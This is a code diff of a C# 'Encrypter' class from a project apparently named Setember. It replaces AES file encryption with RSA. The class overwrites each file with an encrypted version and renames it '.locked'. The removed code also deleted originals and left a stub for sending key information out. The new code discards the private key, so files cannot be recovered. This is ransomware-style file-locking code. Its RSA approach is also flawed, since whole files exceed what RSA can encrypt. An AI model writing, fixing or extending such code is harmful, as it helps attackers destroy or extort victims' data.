@@ -23,148 +23,43 @@ namespace Setember;
 
 public class Encrypter : IDisposable
 {
-    private byte[] Key { get; set; }
-    private byte[] IV { get; set; }
-    private string Password { get; set; }
-    private byte[] PasswordBytes { get; set; }
-
-    private static readonly byte[] Salt = new byte[]
-    {
-        10, 20, 30, 40, 50, 60, 70, 80
-    };
+    private RSAParameters Parameters;
 
     private bool disposedValue;
 
-    public Encrypter()
+    private byte[] Encrypt(byte[] plainBytes)
     {
-        Password = CreatePassword(32);
-        PasswordBytes = GetPasswordBytes(Password);
-        var keys = GenAESKey(PasswordBytes);
-        Key = keys[0];
-        IV = keys[1];
-    }
-
-    #region Encryptation
-    protected async Task<byte[]> EncryptWithAESAsync(byte[] byteToEncrypt)
-    {
-        byte[] encryptedBytes;
-        using (var memoryStream = new MemoryStream())
+        using (RSA rsa = RSA.Create(Parameters))
         {
-            using (var aes = Aes.Create())
-            {
-                aes.KeySize = 256;
-                aes.BlockSize = 128;
-
-                aes.Key = Key;
-                aes.IV = IV;
-
-                aes.Mode = CipherMode.CBC;
-
-                using (var cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
-                {
-                    await cryptoStream.WriteAsync(byteToEncrypt, 0, byteToEncrypt.Length);
-                    cryptoStream.Close();
-                }
-                encryptedBytes = memoryStream.ToArray();
-            }
+            return rsa.Encrypt(plainBytes, RSAEncryptionPadding.OaepSHA512);
         }
-        return encryptedBytes;
     }
 
-    protected byte[] EncryptWithAES(byte[] byteToEncrypt)
+    protected internal async Task EncryptFile(string path)
     {
-        byte[] encryptedBytes;
-        using (var memoryStream = new MemoryStream())
+        try
         {
-            using (var aes = Aes.Create())
-            {
-                aes.KeySize = 256;
-                aes.BlockSize = 128;
-
-                aes.Key = Key;
-                aes.IV = IV;
-
-                aes.Mode = CipherMode.CBC;
-
-                using (var cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
-                {
-                    cryptoStream.Write(byteToEncrypt, 0, byteToEncrypt.Length);
-                    cryptoStream.Close();
-                }
-                encryptedBytes = memoryStream.ToArray();
-            }
+            byte[] fileBytes = await File.ReadAllBytesAsync(path);
+            byte[] encryptedBytes = Encrypt(fileBytes);
+            await File.WriteAllBytesAsync(path, encryptedBytes);
+            File.Move(path, path + ".locked");
         }
-        return encryptedBytes;
-    }
-
-    protected internal async Task EncryptFileAsync(string filePath)
-    {
-        byte[] bytesToEncrypt = File.ReadAllBytes(filePath);
-
-        await Task.Run(async () =>
+        catch (Exception ex)
         {
-            byte[] encryptedBytes = await EncryptWithAESAsync(bytesToEncrypt);
-            await File.WriteAllBytesAsync(filePath, encryptedBytes);
-            try
-            {
-                File.Move(filePath, filePath + ".locked");
-            }
-            catch (Exception ex) { }
-            finally
-            {
-                File.Delete(filePath);
-            }
-        });
-    }
-
-    protected internal void EncryptFile(string filePath)
-    {
-        byte[] bytesToEncrypt = File.ReadAllBytes(filePath);
-        byte[] encryptedBytes = EncryptWithAES(bytesToEncrypt);
-        File.WriteAllBytesAsync(filePath, encryptedBytes);
-        File.Move(filePath, filePath + ".locked");
-    }
-    #endregion
-
-    #region Password and Key generation
-    protected List<byte[]> GenAESKey(byte[] passwordBytes, int KeySizeInBytes = 32, int BlockSizeInBytes = 16)
-    {
-        var keys = new List<byte[]>();
-
-        const ushort iterations = 5000;
-        var keyGenerator = new Rfc2898DeriveBytes(passwordBytes, Salt, iterations);
-
-        // keys[0] = AES.Key
-        keys.Add(keyGenerator.GetBytes(KeySizeInBytes));
-        // Kkeys[1] = AES.IV
-        keys.Add(keyGenerator.GetBytes(BlockSizeInBytes));
-
-        return keys;
-    }
-
-    protected byte[] GetPasswordBytes(string password)
-        => SHA512.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
-
-    protected string CreatePassword(int passwordLength)
-    {
-        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*=/";
-        var random = new Random();
-        var password = new StringBuilder();
-        while (0 < passwordLength--)
-        {
-            password.Append(chars[random.Next(chars.Length - 1)]);
+            Console.WriteLine($"{DateTime.Now}: The file could not be encrypted: {ex}");
         }
-        return password.ToString();
     }
-    #endregion
 
-    #region Info sending
+    protected internal void GenRSAKeyPair()
+    {
+        using (RSA rsa = RSA.Create(4096))
+        {
+            // This method return doesn't include
+            // the private key
+            Parameters = rsa.ExportParameters(false);
+        }
+    }
 
-    // Not implemented yet
-
-    #endregion
-
-    #region Disposing resources
     protected virtual void Dispose(bool disposing)
     {
         if (!disposedValue)
@@ -193,5 +88,4 @@ public class Encrypter : IDisposable
         Dispose(disposing: true);
         GC.SuppressFinalize(this);
     }
-    #endregion
 }
